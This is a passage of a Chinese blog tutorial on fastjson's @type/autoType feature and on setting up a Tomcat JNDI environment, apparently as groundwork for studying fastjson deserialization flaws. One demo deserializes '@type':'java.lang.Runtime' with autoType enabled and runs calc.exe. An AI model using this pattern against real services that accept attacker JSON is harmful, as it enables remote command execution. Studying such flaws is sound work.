class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678851311173-7f2e6fbb-561f-4c31-8208-739a2a71ff7a.png#averageHue=%23767259&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=u6e9a585a&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=182305&status=done&style=none&taskId=u02c4f8e8-800e-47cc-897e-86d2462328c&title=&width=1536" alt="image.png"><br>我们通过<code>@JSONType(orders = &#123;&quot;name&quot;, &quot;age&quot;&#125;)</code>来指定属性的序列化顺序，这样就是<code>name</code>在前，<code>age</code>在后了。</p>
<h2 id="2-type是什么东西？如何反序列化带-type的json字符串？"><a href="#2-type是什么东西？如何反序列化带-type的json字符串？" class="headerlink" title="2. @type是什么东西？如何反序列化带@type的json字符串？"></a>2. @type是什么东西？如何反序列化带@type的json字符串？</h2><blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14601670.html">https://www.cnblogs.com/nice0e3/p/14601670.html</a></p>
</blockquote>
<p>我们在网上看到了很多讲<code>fastjson</code>反序列化漏洞的文章，里面都提到了<code>@type</code>，那么它到底是什么呢？<br><code>@type</code>是<code>fastjson</code>中的一个特殊注解，用于标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型。具体来说，当<code>fastjson</code>从<code>JSON</code>字符串反序列化为<code>Java</code>对象时，如果<code>JSON</code>字符串中包含<code>@type</code>属性，<code>fastjson</code>会根据该属性的值来确定反序列化后的<code>Java</code>对象的类型。请看以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;java.lang&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) JSON.parseObject(json, Object.class);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到直接弹窗了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678869601540-2685c1d7-35f6-45f0-91eb-2ea1e5d42845.png#averageHue=%23807f5c&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=ubbdc38c5&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=202604&status=done&style=none&taskId=uaf5b0ade-bd8a-401d-aeff-cb67221e624&title=&width=1536" alt="image.png"><br>由于<code>fastjson</code>在<code>1.2.24</code>之后默认禁用@type，因此这里我们通过<code>ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</code>来开启，否则会报错<code>autoType is not support</code>。<br>我们再看这样的一个<code>demo</code>：<br>首先是类的定义，例如我们的<code>Person.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是<code>Main.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果为：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680531069142-af92a844-9476-4eda-8546-f7980d14f043.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=816&id=ucb05a2cf&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=155901&status=done&style=none&taskId=u56178bd4-dd62-460c-b947-a440ab336f4&title=&width=1536" alt="image.png"><br>在和前面代码做对比后，可以发现其实就是在调用<code>toJSONString</code>方法的时候，参数里面多了一个<code>SerializerFeature.WriteClassName</code>方法。传入<code>SerializerFeature.WriteClassName</code>可以使得<code>Fastjson</code>支持自省，开启自省后序列化成<code>JSON</code>的数据就会多一个<code>@type</code>，这个是代表对象类型的<code>JSON</code>文本。<code>FastJson</code>的漏洞就是他的这一个功能去产生的，在对该<code>JSON</code>数据进行反序列化的时候，会去调用指定类中对于的<code>get/set/is</code>方法， 后面会详细分析。<br>然后我们就可以通过以下三种方式来反序列化<code>json</code>字符串了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一（返回JSONObject对象）：</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">user.setAge(<span class="number">18</span>);</span><br><span class="line">user.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parse(s1);</span><br><span class="line">System.out.println(jsonObject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二：</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">user.setAge(<span class="number">18</span>);</span><br><span class="line">user.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line"><span class="type">Person</span> <span class="variable">user1</span> <span class="operator">=</span> JSON.parseObject(s, Person.class);</span><br><span class="line">System.out.println(user1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法三：</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">user.setAge(<span class="number">18</span>);</span><br><span class="line">user.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="type">Person</span> <span class="variable">user1</span> <span class="operator">=</span> JSON.parseObject(s1,Person.class);</span><br><span class="line">System.out.println(user1);</span><br></pre></td></tr></table></figure>
<p>执行结果都是一样的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person&#123;name=<span class="string">&#x27;xiaoming&#x27;</span>, age=<span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-JNDI是什么东西？"><a href="#3-JNDI是什么东西？" class="headerlink" title="3. JNDI是什么东西？"></a>3. JNDI是什么东西？</h2><p><code>JNDI</code>是<code>Java</code>平台的一种<code>API</code>，它提供了访问各种命名和目录服务的统一方式。<code>JNDI</code>通常用于在<code>JavaEE</code>应用程序中查找和访问资源，如<code>JDBC</code>数据源、<code>JMS</code>连接工厂和队列等。<br>光这么说还是太抽象了，直接上例子。如果我们想要搭建一个<code>jndi</code>的环境，我们需要这么做：<br>首先需要说明的是我<code>Java</code>版本是<code>17</code>，如果不是的话需要安装配置，不然后面的可能会报错，百度谷歌都没用的那种。</p>
<h3 id="（1）整一个tomcat容器，并在容器中配置数据源"><a href="#（1）整一个tomcat容器，并在容器中配置数据源" class="headerlink" title="（1）整一个tomcat容器，并在容器中配置数据源"></a>（1）整一个tomcat容器，并在容器中配置数据源</h3><p>打开<code>[https://tomcat.apache.org/](https://tomcat.apache.org/)</code>，然后点击<code>Download</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871742488-2dd6261d-7a5a-424f-bd7c-7736a66e24f7.png#averageHue=%23f6f3ef&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=u4a2029d6&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=284463&status=done&style=none&taskId=ua9a3150e-eeab-44fb-aec6-7e1d7b40a5e&title=&width=1489.6" alt="image.png"><br>这里直接选择下载<code>64</code>位<code>Windows</code>的压缩包：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871777883-2d3041ee-6687-40e3-a588-9a2f9020627e.png#averageHue=%23f9f8f6&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=udccaff86&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=168055&status=done&style=none&taskId=ue2c3e7cf-d5b2-4e67-ad6b-4d832a05ced&title=&width=1489.6" alt="image.png"><br>下载链接：<a target="_blank" rel="noopener" href="https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip">https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip</a><br>解压之后，可以给改一个简洁一点的名字，例如<code>tomcat</code>，然后把<code>bin</code>目录放到环境变量中，如下图：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871909392-a153df8e-e003-4b44-93dd-0369206511f6.png#averageHue=%23c3fffe&clientId=u5a3e9323-ecb0-4&from=paste&height=23&id=ud30af5fe&name=image.png&originHeight=29&originWidth=153&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1185&status=done&style=none&taskId=ub5e3125f-4b16-4f27-8dc6-d65ec8071f1&title=&width=122.4" alt="image.png"><br>然后再新建一个名为<code>CATALINA_HOME</code>的路径，值为<code>tomcat</code>的根目录，例如我的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678872011706-5df6e795-dfb8-437c-9863-bf7d5cb0302a.png#averageHue=%23ededec&clientId=u5a3e9323-ecb0-4&from=paste&height=180&id=u4d821b9d&name=image.png&originHeight=225&originWidth=855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15765&status=done&style=none&taskId=u5eecb1bb-124b-4e18-9f96-4390a3d9f89&title=&width=684" alt="image.png"><br>除此之外，没有配置<code>JAVA_HOME</code>和<code>JRE_HOME</code>的也要在用户变量中配置一下，需要注意的是，我这里貌似需要安装并配置<code>Java17</code>，否则一直闪退无法启动：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678875849493-91d36457-7833-42d0-b633-649a62e45492.png#averageHue=%23efeeec&clientId=u5a3e9323-ecb0-4&from=paste&height=575&id=u698825ed&name=image.png&originHeight=719&originWidth=789&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57359&status=done&style=none&taskId=ud6b3239b-7739-47ac-87c8-b0263557477&title=&width=631.2" alt="image.png"><br>双击<code>tomcat</code>的<code>bin</code>目录下的<code>startup.bat</code>，然后访问<code>[http://localhost:8080/](http://localhost:8080/)</code>，就可以看到服务启动成功了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678875916985-26a9e911-1d15-4486-9080-4a6b5c4ef766.png#averageHue=%23f9e8bc&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=u66a0d2d1&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=203547&status=done&style=none&taskId=ubf23ed7a-90f5-4573-a30d-881aceb0073&title=&width=1489.6" alt="image.png"><br>然后配置<code>tomcat</code>目录下的<code>context.xml</code>（<code>tomcat7</code>及以前则是配置<code>server.xml</code>）：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Resource</span> <span class="attr">name</span>=<span class="string">&quot;jdbc/security&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;Container&quot;</span> <span class="attr">type</span>=<span class="string">&quot;javax.sql.DataSource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">maxTotal</span>=<span class="string">&quot;100&quot;</span> <span class="attr">maxIdle</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxWaitMillis</span>=<span class="string">&quot;10000&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">username</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;123456&quot;</span> <span class="attr">driverClassName</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">url</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/security&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884813124-e4662dda-0305-4f74-953d-751043043578.png#averageHue=%23faf8f6&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=u4b4568db&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147663&status=done&style=none&taskId=uf6cb4639-0c7a-4a26-81aa-708db810e85&title=&width=1536" alt="image.png"><br>可以根据自己本地开启的<code>mysql</code>的实际情况来改，我这里是使用<code>phpstudy</code>来安装开启<code>mysql</code>的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678878030641-e131c110-2cbf-40eb-83bd-5a9cbc7f82d1.png#averageHue=%23f6664d&clientId=u5a3e9323-ecb0-4&from=paste&height=630&id=u07a00bb8&name=image.png&originHeight=787&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62447&status=done&style=none&taskId=u4d631b99-0f87-4b27-9fbe-30e87e4318d&title=&width=800" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884839404-7bbfe528-6b66-4a09-a39f-3fba71541850.png#averageHue=%23f2f0f0&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=uf47bd28b&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=189602&status=done&style=none&taskId=u0a385556-b6a2-4666-a56d-af35292aecc&title=&width=1489.6" alt="image.png"><br>然后继续配置<code>tomcat</code>的<code>conf</code>目录下的<code>web.xml</code>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resource-ref</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Test DB Connection<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">res-ref-name</span>&gt;</span>jdbc/root<span class="tag">&lt;/<span class="name">res-ref-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">res-type</span>&gt;</span>javax.sql.DataSource<span class="tag">&lt;/<span class="name">res-type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">res-auth</span>&gt;</span>Container<span class="tag">&lt;/<span class="name">res-auth</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resource-ref</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884890340-20382807-f27e-4944-93ca-3c01025b0e1e.png#averageHue=%23faf8f5&clientId=u5a3e9323-ecb0-4&from=paste&height=754&id=u27b67135&name=image.png&originHeight=942&originWidth=1298&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=127673&status=done&style=none&taskId=ud45b656f-1d40-49ac-b9ea-2a923c485c7&title=&width=1038.4" alt="image.png"></p>
<h3 id="（2）去IDEA里面配置web"><a href="#（2）去IDEA里面配置web" class="headerlink" title="（2）去IDEA里面配置web"></a>（2）去IDEA里面配置web</h3><p>首先先新建一个项目，我命名为<code>jndi_demo</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885151233-80553b0b-4115-4b22-81a2-2f09d7ec0bcf.png#averageHue=%233d4143&clientId=u5a3e9323-ecb0-4&from=paste&height=616&id=u97f4ba70&name=image.png&originHeight=770&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62140&status=done&style=none&taskId=u711deb09-aea9-4362-b061-78fb3799b3d&title=&width=800" alt="image.png"><br>接着配置<code>tomcat</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885256148-bb6a70c4-2040-4dd4-bc2c-ec15f129550d.png#averageHue=%233c3f42&clientId=u5a3e9323-ecb0-4&from=paste&height=809&id=ubc2e9a3b&name=image.png&originHeight=1011&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140947&status=done&style=none&taskId=ueca69d2c-5b70-4f87-830b-d314a54c05a&title=&width=1536" alt="image.png"><br>这里我选择了<code>8089</code>端口，因为我<code>8080</code>端口之前被我占用了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885463623-4eb4fb66-6728-447d-ad91-16edd1827e79.png#averageHue=%233d4144&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ud70ab01d&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75442&status=done&style=none&taskId=ubc655a0e-e250-46a6-945a-c9d49f77248&title=&width=1057.6" alt="image.png"><br>然后：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885908742-a4d7374b-8046-4656-b300-e1e7ef5f861b.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ucaad5837&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72302&status=done&style=none&taskId=u8ceaa752-695d-4f5b-b6f8-4d9a727995a&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886000311-95920e80-ed67-4209-a6ec-2d759a842e51.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u67f85316&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54705&status=done&style=none&taskId=u953ad30f-a157-489b-ba82-f410b2b6ef0&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886015112-7edcf0a1-4cdd-4f7c-aa1f-4edfd2be07d7.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u24a185b3&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69038&status=done&style=none&taskId=u7a926f43-303b-43d6-b3a6-3539868d54a&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886033023-b1dfa5ca-f257-47cf-a089-60cd0c6c8220.png#averageHue=%233d4146&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u73ae6ade&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78123&status=done&style=none&taskId=uca6ee483-3093-4d00-8171-d9096784b84&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940228400-d86c60c7-f6f6-4a1b-bf13-edc32055593e.png#averageHue=%23f4f2f2&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ubb203486&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64387&status=done&style=none&taskId=u102cee43-67c3-4d57-8c3e-66bba745d08&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940285160-03bd07bd-0cf2-4d34-a6f8-ebcc052b2335.png#averageHue=%23f4f4f4&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u6cf8711e&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59684&status=done&style=none&taskId=ue105458a-02d4-46c1-a767-d091e1a0f82&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940273192-99f3ccd4-03b0-4718-b388-f7c8ae601726.png#averageHue=%23f7f5f5&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u4765463e&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=81848&status=done&style=none&taskId=u092f6e04-3bf1-4f40-a96d-dba977918d1&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940545495-c9b4c888-fc80-43aa-95a6-62b6fa4f0c36.png#averageHue=%23f8f4f3&clientId=u5a3e9323-ecb0-4&from=paste&height=524&id=u5782aece&name=image.png&originHeight=655&originWidth=1456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96736&status=done&style=none&taskId=u9965f6de-7b0e-4968-92c5-93b04945fc6&title=&width=1164.8" alt="image.png"><br>然后填写代码运行配置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940431187-6a26c894-0981-41c3-bbea-fc04f2ba05aa.png#averageHue=%23f3f3f3&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uaa500cbd&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71631&status=done&style=none&taskId=ua8132b45-bf0e-4f29-8390-732aeb21065&title=&width=1057.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940460670-a57c6c50-a6f2-4f41-b956-1f79301227e0.png#averageHue=%23f6f6f5&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uecd3abc9&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48017&status=done&style=none&taskId=u929bdaa4-97ae-4e06-81bf-8141f26456e&title=&width=1057.6" alt="image.png"></p>
<h3 id="（3）跑jndi的demo代码，感受jndi的用处"><a href="#（3）跑jndi的demo代码，感受jndi的用处" class="headerlink" title="（3）跑jndi的demo代码，感受jndi的用处"></a>（3）跑jndi的demo代码，感受jndi的用处</h3><p>然后贴上如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> 